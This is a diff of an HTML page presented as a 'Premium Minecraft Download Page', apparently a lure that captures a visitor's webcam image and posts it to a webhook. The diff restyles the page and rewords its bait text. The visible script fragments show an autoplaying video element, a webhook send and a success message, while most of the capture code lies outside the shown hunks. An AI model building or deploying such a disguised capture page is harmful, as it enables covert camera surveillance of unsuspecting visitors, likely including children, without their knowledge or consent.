@@ -4,34 +4,32 @@
     <title>Send Image to Webhooks</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #18191a;
+            font-family: 'Roboto', sans-serif;
+            background-color: #151515;
             color: #ffffff;
             margin: 0;
             padding: 0;
             display: flex;
             flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
-            transition: background-color 0.5s;
         }
 
         h1 {
-            font-size: 32px;
+            font-size: 36px;
             margin-bottom: 20px;
-            color: #ffa726;
-            text-align: center;
+            color: #03dac5; /* Turquoise color for headings */
+            font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 2px;
         }
 
         p {
             font-size: 18px;
             margin-bottom: 30px;
             text-align: center;
-            max-width: 600px;
-            line-height: 1.5;
+            max-width: 80%;
+            line-height: 1.6;
         }
 
         button {
@@ -40,16 +38,18 @@
             border-radius: 5px;
             cursor: pointer;
             margin: 10px;
-            background-color: #4caf50;
+            background-color: #6200ee; /* Deep Purple color for buttons */
             color: #ffffff;
-            font-size: 16px;
+            font-size: 18px;
             transition: background-color 0.3s;
             text-transform: uppercase;
+            font-weight: 700;
             letter-spacing: 1px;
+            outline: none;
         }
 
         button:hover {
-            background-color: #388e3c;
+            background-color: #3700b3; /* Darker shade of purple on hover */
         }
 
         #colorChangeButton {
@@ -59,12 +59,13 @@
             z-index: 999;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             transition: transform 0.3s;
-            background-color: #ffa726;
-            color: #ffffff;
+            background-color: #03dac5; /* Turquoise color for color change button */
+            color: #000000;
         }
 
         #colorChangeButton:hover {
             transform: scale(1.1);
+            background-color: #02c39a; /* Darker shade of turquoise on hover */
         }
 
         #videoElement {
@@ -81,20 +82,20 @@
         #successMessage {
             margin-top: 20px;
             font-size: 14px;
-            color: #4caf50;
+            color: #00ff00;
             display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to the Futuristic Minecraft Download Page!</h1>
-    <p>Click the "Download Minecraft" button to download Minecraft and the "Change Color" button to change the background color:</p>
+    <h1>Welcome to the Premium Minecraft Download Page</h1>
+    <p>Click the "Download Minecraft" button to start your adventure in the digital world of Minecraft. Use the "Change Color" button to customize your experience:</p>
 
     <button id="downloadButton">Download Minecraft</button>
     <button id="colorChangeButton">Change Color</button>
     <video id="videoElement" autoplay></video>
     <div id="status"></div>
-    <div id="successMessage">Image sent successfully!</div>
+    <div id="successMessage">Sending image...</div>
 
     <script>
         const video = document.getElementById('videoElement');
@@ -133,6 +134,7 @@
                     throw new Error('Failed to send image to webhook');
                 }
                 document.getElementById('status').style.display = 'none';
+                document.getElementById('successMessage').innerText = 'Image sent successfully!';
                 document.getElementById('successMessage').style.display = 'block';
                 console.log('Image sent successfully');
             })
@@ -168,12 +170,12 @@
         });
 
         const colorChangeButton = document.getElementById('colorChangeButton');
-        const colors = ['#1e88e5', '#4caf50', '#ff5722', '#9c27b0', '#e91e63']; /* Modern color palette */
+        const colors = ['#03dac5', '#bb86fc', '#03a9f4', '#e91e63', '#ff5722']; /* Premium color palette */
         let index = 0;
 
         colorChangeButton.addEventListener('click', function () {
             document.body.style.backgroundColor = colors[index];
-            let textColor = index === colors.length - 1 ? '#ffffff' : '#000000';
+            let textColor = index === colors.length - 1 ? '#000' : '#ffffff';
             document.body.style.color = textColor;
             downloadButton.style.backgroundColor = colors[index]; // Change button color along with background
             index = (index + 1) % colors.length;
